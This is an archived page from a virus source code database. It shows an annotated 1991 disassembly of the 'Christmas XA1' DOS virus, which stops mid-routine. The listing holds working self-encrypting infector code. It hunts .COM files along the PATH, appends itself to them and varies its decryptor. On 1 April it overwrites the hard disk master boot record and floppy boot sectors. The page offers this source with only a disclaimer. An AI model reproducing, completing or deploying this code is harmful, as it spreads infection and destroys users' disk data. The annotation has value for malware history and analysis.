<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: xa1__asm</title>
<meta name="KEYWORDS" content="xa1_.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for xa1_.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="x_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x_1_asm.php">x_1_asm</a><br>
<a href="x-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x-1_asm.php">x-1_asm</a><br>
<a href="x_2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x_2_asm.php">x_2_asm</a><br>
<a href="x-2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x-2_asm.php">x-2_asm</a><br>
<a href="xa1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xa1__asm.php">xa1__asm</a><br>
<a href="xa1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xa1_asm.php">xa1_asm</a><br>
<a href="x__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x__asm.php">x__asm</a><br>
<a href="x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x_asm.php">x_asm</a><br>
<a href="xboot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xboot_asm.php">xboot_asm</a><br>
<a href="xdx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xdx_asm.php">xdx_asm</a><br>
<a href="xmas_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xmas_pas.php">xmas_pas</a><br>
<a href="xph-1029_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xph-1029_asm.php">xph-1029_asm</a><br>
<a href="xph_1100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xph_1100_asm.php">xph_1100_asm</a><br>
<a href="xph-1100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xph-1100_asm.php">xph-1100_asm</a><br>
<a href="xxx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xxx_asm.php">xxx_asm</a><br>
<a href="xyz__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xyz__asm.php">xyz__asm</a><br>
<a href="xyz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xyz_asm.php">xyz_asm</a><br>
<a href="xyz-v2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xyz-v2_asm.php">xyz-v2_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/z/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/z/index.php'" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;========================================================;
;                Virus "Christmas XA1"                   ;
;        dissasembly of memory resident virus            ;
;          (or file virus after encryption)              ;
;                                                        ;
;        dissasembled: Marek Sell, July 1991             ;
;     dissassembly veryfied by MASM reassemblation       ;
;                                                        ;
;     (C) Polish Section of Virus Information Bank       ;
;--------------------------------------------------------;

cseg          segment
      assume cs:cseg, ds:cseg, es:cseg, ss:cseg
      org    100h

L0100:        JMP    short L0109            ;0100 EB07

      DB     56H,0AH,3,59H,0        ;contamination ptr             ;0102 56 0A 03 59 00

L0107         dw     2AH          ;contamined files countr;0107 2A 00

L0109:        PUSH   CS                     ;0109 0E
      CALL   L010D                  ;010A E80000
L010D:        CLI                                                                ;010D FA
      MOV    BP,SP                                                       ;010E 8BEC
      POP    AX                                                        ;010D  ;0110 58
      XOR    AL,AL                                                       ;0111 32C0
      MOV    [BP+2],AX                                             ;100h to stack ;0113 894602
      ADD    WORD PTR [BP+0],offset L0135-offset L010D ;10Dh+28h=135h  ;0116 8146002800

      MOV    CX,05CEh                                                   ;011B B9CE05
      MOV    AL,8Ch                                                      ;011E B08C
L011F         equ    $-1                                                       ;byte = encryption key

      MOV    [BP-1],AL                                                  ;0120 8846FF
      MOV    BX,[BP+0]                                             ;0135  ;0123 8B5E00
L0124         equ    $-2                                                       
      ;mov   bx,[bp+0] (8B 5E 00)   ;var 1, 2, 3
      ;mov   si,[bp+0] (8B 76 00)   ;var 4, 5, 6
      ;mov   di,[bp+0] (8B 7E 00)   ;var 7, 8, 9

L0126:        MOV    [BP-2],CL                                                  ;0126 884EFE
      MOV    CL,[BP-1]                                             ;08Ch  ;0129 8A4EFF
L012C:        ROL    BYTE PTR [BX],CL       ;00Fh ->0F0h                   ;012C D207
      ;add   byte ptr [bx],cl (00 0F)                              ;var 1
      ;xor   byte ptr [bx],cl (30 0F)                              ;var 2
      ;rol   byte ptr [bx],cl (D2 07)                              ;var 3
      ;add   byte ptr [si],cl (00 0C)                              ;var 4
      ;xor   byte ptr [si],cl (30 0C)                              ;var 5
      ;rol   byte ptr [si],cl (D2 04)                              ;var 6
      ;add   byte ptr [di],cl (00 0D)                              ;var 7
      ;xor   byte ptr [di],cl (30 0D)                              ;var 8
      ;rol   byte ptr [di],cl (D2 05)                              ;var 9

      JMP    short L0130                                           ;flush prefetch ;012E EB00

L0130:        INC    BX                                                          ;0130 43
      ;inc   bx (43)                                               ;var 1, 2, 3
      ;inc   si (46)                                               ;var 4, 5, 6
      ;inc   di (47)                                               ;var 7, 8, 9

      MOV    CL,[BP-02]                                            ;CEh  ;0131 8A4EFE
      LOOP   L0126                                                       ;0134 E2F0
;---------------^^
;this byte is encoded too

L0135         equ    $-1                    ;begin of encoded area

;===========================================================
;             Encoded part of virus
;-----------------------------------------------------------
      STI                                                                ;0136 FB
      MOV    AH,2Fh                                                ;get DTA  ;0137 B42F
      INT    21h                                                         ;0139 CD21
      PUSH   ES                                                    ;DTA segment  ;013B 06
      PUSH   BX                                                    ;DTA offset  ;013C 53
      XOR    AX,AX                                                       ;013D 33C0
      MOV    DS,AX                                                       ;013F 8ED8
      MOV    AL,ds:[0417h]          ;shift status                      ;0141 A01704
      AND    AL,10h                                                ;Scroll Lock  ;0144 2410
      PUSH   AX                                                          ;0146 50
      AND    BYTE PTR ds:[0417h],0EFh;-Scroll Lock                 ;0147 80261704EF
      MOV    AX,CS                                                       ;014C 8CC8
      MOV    DS,AX                                                       ;014E 8ED8
      MOV    DX,offset L06C6        ;new int 24h                       ;0150 BAC606
      MOV    AX,2524h               ;Set int 24h                       ;0153 B82425
      INT    21h                                                         ;0156 CD21
      MOV    AX,ds:[002Ch]          ;environment segment           ;0158 A12C00
      MOV    ES,AX                                                       ;015B 8EC0
      XOR    DI,DI                                                 ;in environment offset ;015D 33FF
      CLD                                                                ;015F FC
L0160:        CMP    BYTE PTR es:[DI],00                                       ;0160 26803D00
      JZ     L0183                                                 ;-> end of environment ;0164 741D
      MOV    SI,offset L051B        ;'PATH='                           ;0166 BE1B05
      MOV    CX,0005                                                     ;0169 B90500
      MOV    AX,DI                                                       ;016C 8BC7
      REPZ   CMPSB                                                       ;016E F3 A6
      JZ     L0183                                                 ;-> found  ;0170 7411

   ;<- find end of current environment value
      MOV    DI,AX                                                       ;0172 8BF8
      XOR    AL,AL                                                       ;0174 32C0
      MOV    CH,0FFh                                                     ;0176 B5FF
      REPNZ  SCASB                                                       ;0178 F2 AE
      JZ     L0160                                                 ;-> found  ;017A 74E4

      MOV    DI,offset L051A        ;db 0                               ;017C BF1A05
      MOV    AX,CS                                                       ;017F 8CC8
      MOV    ES,AX                                                       ;0181 8EC0

L0183:        MOV    WORD PTR [L05C1],offset L0562                             ;0183 C706C1056205
      MOV    DX,offset L0536        ;new DTA address               ;0189 BA3605
      MOV    AH,1Ah                                                ;set DTA ds:dx  ;018C B41A
      INT    21h                                                         ;018E CD21

      MOV    AX,[L06F9]                                                 ;0190 A1F906
      MOV    [L06F7],AX                                                 ;0193 A3F706
      MOV    AX,[L06FD]                                                 ;0196 A1FD06
      MOV    [L06FB],AX                                                 ;0199 A3FB06
      MOV    CX,0005                                                     ;019C B90500
      MOV    DX,offset L0515        ;*.com                              ;019F BA1505
      PUSH   ES                                                          ;01A2 06
      PUSH   DI                                                          ;01A3 57
      PUSH   CX                                                          ;01A4 51

L01A5:        MOV    AX,CS                                                       ;01A5 8CC8
      MOV    ES,AX                                                       ;01A7 8EC0
      MOV    CX,0FFFFh                                                  ;01A9 B9FFFF
      MOV    AH,4Eh                                                ;Find First  ;01AC B44E
      JMP    short L01B6                                                ;01AE EB06

L01B0:        POP    CX                                                          ;01B0 59
      JCXZ   L020E                                                 ;-> enought contamined ;01B1 E35B
      MOV    AH,4Fh                                                ;Find next  ;01B3 B44F
      PUSH   CX                                                          ;01B5 51
L01B6:        INT    21h                                                         ;01B6 CD21
      JB     L01BD                                                 ;-> error  ;01B8 7203
      JMP    L02AE                                                 ;-> file match  ;01BA E9F100

L01BD:        POP    CX                                                    ;init to 5  ;01BD 59
      POP    DI                                                    ;path value address ;01BE 5F
      POP    ES                                                    ;path segment  ;01BF 07

L01C0:        CMP    BYTE PTR ES:[DI],00                                       ;01C0 26 803D00
      JZ     L0210                                                 ;-> end of path  ;01C4 744A
      MOV    BX,offset L0562        ;curent path                       ;01C6 BB6205

L01C9:        MOV    AL,ES:[DI]             ;byte from 'PATH'              ;01C9 26 8A 05
      OR     AL,AL                                                       ;01CC 0AC0
      JZ     L01DA                                                 ;-> End of env. value ;01CE 740A
      INC    DI                                                          ;01D0 47
      CMP    AL,3Bh                                                ;';' End of directory ;01D1 3C3B
      JZ     L01DA                                                 ;->yes   ;01D3 7405
      MOV    [BX],AL                                               ;store byte in cur path ;01D5 8807
      INC    BX                                                          ;01D7 43
      JMP    L01C9                                                 ;-> next char  ;01D8 EBEF

L01DA:        CMP    BX,offset L0562        ;no char stored                ?   ;01DA 81FB6205
      JZ     L01C0                                                 ;-> yes   ;01DE 74E0
      MOV    AL,[BX-1]              ;last char                         ;01E0 8A47FF
      CMP    AL,3Ah                                                ;':'   ;01E3 3C3A
      JZ     L01EF                                                 ;-> yes   ;01E5 7408
      CMP    AL,5Ch                                                ;'\'   ;01E7 3C5C
      JZ     L01EF                                                 ;-> yes   ;01E9 7404
      MOV    BYTE PTR [BX],'\'                                         ;01EB C6075C
      INC    BX                                                          ;01EE 43

L01EF:        PUSH   ES                                                    ;environment segment ;01EF 06
      PUSH   DI                                                    ;in environment offset ;01F0 57
      PUSH   CX                                                          ;01F1 51
      MOV    [L05C1],BX             ;End of directory path         ;01F2 891EC105
      MOV    SI,BX                                                       ;01F6 8BF3
      SUB    BX,offset L0562        ;                                   ;01F8 81EB6205
      MOV    CX,BX                                                 ;length of dir name ;01FC 8BCB
      MOV    DI,offset L0514        ;'\*.COM',0                        ;01FE BF1405
      MOV    AX,CS                                                       ;0201 8CC8
      MOV    ES,AX                                                       ;0203 8EC0
      DEC    SI                                                          ;0205 4E
      STD                                                          ;direction down  ;0206 FD
      REPZ   MOVSB                                                       ;0207 F3 A4
      MOV    DX,DI                                                       ;0209 8BD7
      INC    DX                                                    ;first char of filename ;020B 42
      JMP    L01A5                                                       ;020C EB97

   ;<- 5 contamined files
L020E:        POP    AX                                                          ;020E 58
      POP    AX                                                          ;020F 58

   ;<- End of path (no more files)
L0210:        MOV    AX,CS                                                       ;0210 8CC8
      MOV    ES,AX                                                       ;0212 8EC0
      MOV    AH,2Ah                                                ;Get system date ;0214 B42A
      INT    21h                                                         ;0216 CD21
      CMP    DX,0401h               ;1 April                           ;0218 81FA0104
      JNZ    L0251                                                 ;-> no   ;021C 7533
      MOV    DX,0080h               ;head 0,  1 st HDD             ;021E BA8000
      MOV    CX,0001                                               ;track 0, sector 1 ;0221 B90100
      MOV    BX,0703h               ;disk buffer                       ;0224 BB0307
      MOV    AX,0201h               ;read 1 sector                     ;0227 B80102
      PUSH   DX                                                          ;022A 52
      PUSH   CX                                                          ;022B 51
      PUSH   BX                                                          ;022C 53
      INT    13h                                                         ;022D CD13
      POP    BX                                                          ;022F 5B
      POP    CX                                                          ;0230 59
      POP    DX                                                          ;0231 5A
      MOV    CL,11h                                                ;track 0, sector 17 ;0232 B111
      MOV    AX,0301h               ;write 1 sector                    ;0234 B80103
      INT    13h                                                   ;save MBR  ;0237 CD13
      MOV    WORD PTR [L0637+200h-2],0AA55h                            ;0239 C706350855AA
      MOV    DL,80h                                                ;head 0, 1st HDD ;023F B280
      CALL   L06B8                                                 ;change MBR  ;0241 E87404
      XOR    DL,DL                                                 ;head 0, 1st FDD ;0244 32D2
      CALL   L06B8                                                 ;change boot-sector ;0246 E86F04
      MOV    DL,01                                                 ;head 0, 2nd FDD ;0249 B201
      CALL   L06B8                                                 ;change boot-sector ;024B E86A04
      JMP    short L025A            ;-> O.K.                           ;024E EB0A
      NOP                                                                ;0250 90

L0251:        CMP    DX,0C18h               ;24 december                       ;0251 81FA180C
      JB     L025A                                                 ;-> bellow  ;0255 7203
      CALL   L05D7                  ;Display Christmas Tree            ;0257 E87D03

L025A:        IN     AL,40h                                                      ;025A E440
      CMP    AL,0F8h                                                     ;025C 3CF8
      JB     L0266                                                       ;025E 7206
      IN     AL,61h                                                      ;0260 E461
      OR     AL,03                                                 ;Speaker on  ;0262 0C03
      OUT    61h,AL                                                      ;0264 E661

L0266:        XOR    AX,AX                                                       ;0266 33C0
      MOV    DS,AX                                                       ;0268 8ED8
      POP    AX                                                    ;Scroll Lock state ;026A 58
      OR     ds:[0417h],AL                                              ;026B 08061704
      MOV    DS,cs:[0014h]          ;int 24h vector                    ;026F 2E8E1E1400
      MOV    DX,cs:[0012h]                                              ;0274 2E8B161200
      MOV    AX,2524h               ;set int 24h vector            ;0279 B82425
      INT    21h                                                         ;027C CD21
      POP    DX                                                    ;oryginal DTA seg/offs ;027E 5A
      POP    DS                                                          ;027F 1F
      MOV    AH,1Ah                                                ;set DTA address ;0280 B41A
      INT    21h                                                         ;0282 CD21
      MOV    AX,CS                                                       ;0284 8CC8
      MOV    DS,AX                                                       ;0286 8ED8
      MOV    SI,offset L06F0        ;code to restore victim        ;0288 BEF006
      MOV    DI,[L06F7]             ;victim length+100h            ;028B 8B3EF706
      ADD    DI,[L06FB]             ;virus length                      ;028F 033EFB06
      PUSH   DI                                                    ;end of program  ;0293 57
      MOV    CX,0007                                               ;code length  ;0294 B90700
      CLD                                                                ;0297 FC
      REPZ   MOVSB                                                       ;0298 F3 A4
      XOR    AX,AX                                                 ;reset registers ;029A 33C0
      MOV    BX,AX                                                       ;029C 8BD8
      MOV    DX,AX                                                       ;029E 8BD0
      MOV    BP,AX                                                       ;02A0 8BE8
      MOV    SI,[L06F7]             ;victim length+100h            ;02A2 8B36F706
      MOV    DI,0100h               ;place for oryginal byte;02A6 BF0001
      MOV    CX,[L06FB]             ;virus length                      ;02A9 8B0EFB06
      RET                                                                ;02AD C3

     ;<- Founded next victim
L02AE:        MOV    SI,offset L0554        ;founded file name             ;02AE BE5405
      MOV    DI,[L05C1]             ;end of directory path         ;02B1 8B3EC105
      MOV    CX,000Dh               ;name length                       ;02B5 B90D00
      CLD                                                                ;02B8 FC
      REPZ   MOVSB                                                       ;02B9 F3 A4
      MOV    DI,offset L0520        ;'IBMBIO.COM'                      ;02BB BF2005
      CALL   L04BB                                                 ;compare current file ;02BE E8FA01
      JNZ    L02C6                                                 ;-> not equal  ;02C1 7503
      JMP    L01B0                                                 ;-> find next file ;02C3 E9EAFE

L02C6:        MOV    DI,offset L052B        ;'IBMDOS.COM'                      ;02C6 BF2B05
      CALL   L04BB                                                 ;compare current file ;02C9 E8EF01
      JNZ    L02D1                                                 ;-> not the same ;02CC 7503
      JMP    L01B0                                                 ;-> find next file ;02CE E9DFFE

L02D1:        MOV    BYTE PTR [L0561],00    ;no attr change                ;02D1 C606610500
      NOP                                                                ;02D6 90
      TEST   BYTE PTR [L054B],07    ;file attribute                ;02D7 F6064B0507
      JZ     L02ED                                                 ;-> not set  ;02DC 740F

      MOV    DX,offset L0562        ;file name & path              ;02DE BA6205
      XOR    CX,CX                                                 ;new attribute  ;02E1 33C9
      MOV    AX,4301h               ;set file attribute            ;02E3 B80143
      INT    21h                                                         ;02E6 CD21
      JAE    L02ED                                                 ;-> no error  ;02E8 7303
      JMP    L01B0                                                 ;-> error, find next ;02EA E9C3FE

L02ED:        MOV    DX,offset L0562        ;file name & path              ;02ED BA6205
      MOV    AX,3D02h               ;open file R/W                     ;02F0 B8023D
      INT    21h                                                         ;02F3 CD21
      MOV    BX,AX                                                 ;file handle  ;02F5 8BD8
      JAE    L02FC                                                 ;-> O.K.  ;02F7 7303
      JMP    L01B0                                                 ;-> error, find next ;02F9 E9B4FE

L02FC:        MOV    AX,[L0552]             ;file size high                    ;02FC A15205
      OR     AX,AX                                                       ;02FF 0BC0
      JZ     L0306                                                 ;-> O.K.  ;0301 7403
L0303:        JMP    L0496                                                 ;-> file to big, next ;0303 E99001

L0306:        MOV    AX,[L0550]             ;file size low                     ;0306 A15005
      CMP    AX,0007                                                     ;0309 3D0700
      JB     L0303                                                 ;-> file to small ;030C 72F5
      CMP    AX,0F800h                                                  ;030E 3D00F8
      JAE    L0303                                                 ;-> file to big  ;0311 73F0
      MOV    DX,[L06F7]             ;current file length           ;0313 8B16F706
      ADD    DX,[L06FB]             ;virus length                      ;0317 0316FB06
      MOV    CX,0007                                               ;bytes to read  ;031B B90700
      PUSH   DX                                                          ;031E 52
      PUSH   CX                                                          ;031F 51
      MOV    AH,3Fh                                                ;read handle  ;0320 B43F
      INT    21h                                                         ;0322 CD21
      POP    CX                                                          ;0324 59
      POP    SI                                                          ;0325 5E
      JB     L0330                                                 ;-> error, next file ;0326 7208
      MOV    DI,0100h                                                   ;0328 BF0001
      CLD                                                                ;032B FC
      REPZ   CMPSB                                                       ;032C F3 A6
      JNZ    L0333                                                 ;-> not contamined yet ;032E 7503
L0330:        JMP    L0496                                                       ;0330 E96301

L0333:        MOV    AX,5700h               ;get file date & time          ;0333 B80057
      INT    21h                                                         ;0336 CD21
      JB     L0330                                                 ;-> error, get next ;0338 72F6
      MOV    [L0701],DX             ;victim date                       ;033A 89160107
      MOV    [L06FF],CX             ;victim time                       ;033E 890EFF06
      MOV    BYTE PTR [L0561],1     ;attr chng ptr                 ;0342 C606610501
      NOP                                                                ;0347 90
      MOV    AX,[L0550]             ;file size low                     ;0348 A15005
      CMP    AX,0603h               ;virus length                      ;034B 3D0306
      JAE    L0371                                                 ;-> file bigger then vir;034E 7321
      XOR    DX,DX                                                       ;0350 33D2
      XOR    CX,CX                                                       ;0352 33C9
      MOV    AX,4202h               ;set file ptr EOF+0            ;0354 B80242
      INT    21h                                                         ;0357 CD21
      JAE    L035E                                                 ;-> no error  ;0359 7303
      JMP    L0496                                                 ;-> error, get next ;035B E93801

L035E:        MOV    CX,0603h               ;virus length                      ;035E B90306
      SUB    CX,[L0550]             ;- file length                     ;0361 2B0E5005
      MOV    AH,40h                                                ;write handle  ;0365 B440
      INT    21h                                                         ;0367 CD21
      MOV    AX,0603h               ;new file length               ;0369 B80306
      JAE    L0371                                                 ;-> no error  ;036C 7303
      JMP    L0496                                                 ;-> error, get next ;036E E92501

L0371:        INC    AH                                                    ;+100h (PSP length) ;0371 FEC4
      MOV    [L06F9],AX             ;victim length + 100h          ;0373 A3F906
      MOV    AX,[L0550]             ;real file length              ;0376 A15005
      MOV    SI,0603h               ;virus length                      ;0379 BE0306
      XOR    DI,DI                                                       ;037C 33FF
      CMP    AX,SI                                                       ;037E 3BC6
      JAE    L0384                                                       ;0380 7302
      MOV    SI,AX                                                       ;0382 8BF0
L0384:        MOV    [L06FD],SI                                                 ;0384 8936FD06
L0388:        MOV    DX,DI                                                       ;0388 8BD7
      XOR    CX,CX                                                       ;038A 33C9
      MOV    AX,4200h               ;set file ptr                      ;038C B80042
      INT    21h                                                         ;038F CD21
      JAE    L0396                                                 ;-> O.K.  ;0391 7303
      JMP    L0496                                                 ;-> error, get next ;0393 E90001

L0396:        MOV    DX,[L06F7]             ;program end                       ;0396 8B16F706
      ADD    DX,[L06FB]             ;virus length                      ;039A 0316FB06
      MOV    CX,0200h               ;part to read length           ;039E B90002
      CMP    SI,CX                                                       ;03A1 3BF1
      JAE    L03A7                                                       ;03A3 7302
      MOV    CX,SI                                                       ;03A5 8BCE
L03A7:        PUSH   DX                                                          ;03A7 52
      PUSH   CX                                                          ;03A8 51
      MOV    AH,3Fh                                                ;read handle  ;03A9 B43F
      INT    21h                                                         ;03AB CD21
      POP    CX                                                          ;03AD 59
      POP    DX                                                          ;03AE 5A
      JAE    L03B4                                                 ;-> O.K.  ;03AF 7303
      JMP    L0496                                                 ;-> error, get next ;03B1 E9E200

L03B4:        PUSH   DX                                                          ;03B4 52
      PUSH   CX                                                          ;03B5 51
      XOR    DX,DX                                                       ;03B6 33D2
      XOR    CX,CX                                                       ;03B8 33C9
      MOV    AX,4202h               ;set file ptr EOF+0            ;03BA B80242
      INT    21h                                                         ;03BD CD21
      POP    CX                                                          ;03BF 59
      POP    DX                                                          ;03C0 5A
      JAE    L03C6                                                 ;-> O.K.  ;03C1 7303
      JMP    L0496                                                 ;-> error, get next ;03C3 E9D000

L03C6:        MOV    AH,40h                                                ;write handle  ;03C6 B440
      INT    21h                                                         ;03C8 CD21
      JAE    L03CF                                                 ;-> O.K.  ;03CA 7303
      JMP    L0496                                                 ;error, get next ;03CC E9C700

L03CF:        ADD    DI,0200h               ;begin of file ptr             ;03CF 81C70002
      SUB    SI,0200h               ;bytes left                        ;03D3 81EE0002
      JBE    L03DB                                                 ;-> ready  ;03D7 7602
      JMP    L0388                                                 ;-> rewrite next ;03D9 EBAD

L03DB:        INC    WORD PTR [L0107]                                          ;03DB FF060701
      XOR    DX,DX                                                       ;03DF 33D2
      XOR    CX,CX                                                       ;03E1 33C9
      MOV    AX,4200h               ;Set file ptr BOF+0            ;03E3 B80042
      INT    21h                                                         ;03E6 CD21
      JAE    L03ED                                                 ;-> O.K.  ;03E8 7303
      JMP    L0496                                                 ;-> error, get next ;03EA E9A900

L03ED:        PUSH   BX                    ; file handle  ;03ED 53
L03EE:        IN     AL,40h                ; 03EE E440
      TEST   AL,07h                        ; 03F0 A807
      JZ     L03EE                         ; 03F2 74FA
      MOV    byte ptr [L011F],AL ;new encription key               ;03F4 A21F01
      XOR    AX,AX                                                       ;03F7 33C0
      MOV    BH,AL                                                       ;03F9 8AF8
      MOV    DS,AX                                                       ;03FB 8ED8
      MOV    AL,ds:[046Ch]          ;system timer low byte         ;03FD A06C04
      MOV    DX,CS                        ;0400 8CCA
      MOV    DS,DX                        ;0402 8EDA
      MOV    CL,03                        ;0404 B103
      DIV    CL                           ;0406 F6F1
      MOV    CH,AH                  ;reminder  ;0408 8AEC
      XOR    AH,AH                              ;040A 32E4
      DIV    CL                                 ;040C F6F1
      MOV    AL,AH                  ;reminder  ;040E 8AC4
      ADD    AL,AL                  ;*2   ;0410 02C0
      ADD    AL,AH                  ;*3   ;0412 02C4
      ADD    AL,CH                  ;first reminder  ;0414 02C5
      MOV    BL,AL                  ;0 - 8   ;0416 8AD8
      ADD    BX,BX                  ;* 2   ;0418 03DB
      ADD    BX,BX                  ;* 4   ;041A 03DB
      ADD    BX,offset L06C9                                            ;041C 81C3C906
      MOV    AL,[BX]                ;5Eh/76h/7Eh  ;0420 8A07
      MOV    byte ptr [L0124],AL                                       ;0422 A22401
      MOV    AX,[BX+01]             ;0F00/0F30/07D2...             ;0425 8B4701
      MOV    word ptr [L012C],AX                                       ;0428 A32C01
      MOV    AL,[BX+03]             ;43h/46h/47h                       ;042B 8A4703
      MOV    byte ptr [L0130],AL                                       ;042E A23001
      MOV    AL,CH                  ;first reminder  ;0431 8AC5
      MOV    BX,offset L06ED                                            ;0433 BBED06
      XLAT                                                               ;0436 D7
      MOV    byte ptr [L0461],AL    ;28h/30h/D2h                   ;0437 A26104
      POP    BX                                                          ;043A 5B
      MOV    DX,0100h               ;encoding procedure            ;043B BA0001
      MOV    CX,0035h               ;procedure length              ;043E B93500
      MOV    AH,40h                 ;write handle  ;0441 B440
      INT    21h                                                         ;0443 CD21
      JB     L0496                              ;-> error, get next ;0445 724F
      MOV    SI,offset L0135                                            ;0447 BE3501
      MOV    CX,05CEh               ;603h-100h-35h                     ;044A B9CE05
L044D:        PUSH   BX                                                          ;044D 53
      PUSH   CX                                                          ;044E 51
      MOV    AX,0200h                                                   ;044F B80002
      MOV    BX,[L06F7]             ;count buffer address          ;0452 8B1EF706
      ADD    BX,[L06FB]                                                 ;0456 031EFB06
      PUSH   BX                                                          ;045A 53
      MOV    CL,byte ptr [L011F]    ;encription key                ;045B 8A0E1F01
L045F:
      MOV    CH,[SI]                                                     ;045F 8A2C

L0461:
      ROR    CH,CL                                                       ;0461 D2CD
      ;sub   ch,cl (28 CD)          ;var 1, 4, 7
      ;xor   ch,cl (30 CD)          ;var 2, 5, 8
      ;ror   ch,cl (D2 CD)          ;var 3, 6, 9

      MOV    [BX],CH                                                     ;0463 882F
      INC    BX                                                          ;0465 43
      INC    SI                                                          ;0466 46
      DEC    AX                                                          ;0467 48
      JNZ    L045F                          ; encription loop ;0468 75F5
      POP    DX                                                          ;046A 5A
      POP    CX                                                          ;046B 59
      POP    BX                                                          ;046C 5B
      PUSH   CX                                                          ;046D 51
      CMP    CX,0201h                                                   ;046E 81F90102
      JB     L0477                  ; last virus part ;0472 7203
      MOV    CX,0200h               ;bytes to write                    ;0474 B90002
L0477:
      MOV    AH,40h                 ; write handle  ;0477 B440
      INT    21h                                                         ;0479 CD21
      POP    CX                                                          ;047B 59
      JB     L0496                  ; error, get next ;047C 7218
      SUB    CX,0200h               ; - portion length             ;047E 81E90002
      JA     L044D                  ; not all written yet ;0482 77C9

      MOV    DX,[L0701]             ;saved file date               ;0484 8B160107
